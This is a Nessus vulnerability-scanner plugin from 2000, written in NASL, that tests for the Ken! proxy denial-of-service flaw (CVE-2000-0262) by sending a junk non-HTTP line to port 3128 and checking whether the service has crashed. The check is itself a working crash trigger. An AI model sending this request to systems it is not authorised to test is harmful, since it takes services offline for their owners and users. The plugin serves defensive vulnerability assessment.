#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10375);
 script_bugtraq_id(1103);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2000-0262");
 script_xref(name:"OSVDB", value:"13157");

 name["english"] = "Ken! DoS";
 name["francais"] = "Déni de service contre Ken!";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote service 
(very likely Ken! proxy software)
crash by sending a non-http request to this port.

In the case of the Ken! proxy, this attack can only
performed from inside the LAN.


Solution : contact your vendor for a fix
Risk factor : High";

 desc["francais"] = "
Il est possible de faire planter le service
distant (probablement le proxy Ken!)
en lui envoyant une requete non-http.

Dans le cas du proxy Ken! cette attaque n'est
effective que si elle est lancée à partir de
l'interieur du LAN.

Solution : contactez votre vendeur pour un patch
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Ken! Segmentation fault";
 summary["francais"] = "Erreur de segmentation dans Ken!";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
  script_require_ports(3128);
 exit(0);
}

#
# The script code starts here
#

port = 3128;
if(get_port_state(port))
{
 data = string("Whooopppss_Ken_died\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  send(socket:soc, data:data);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
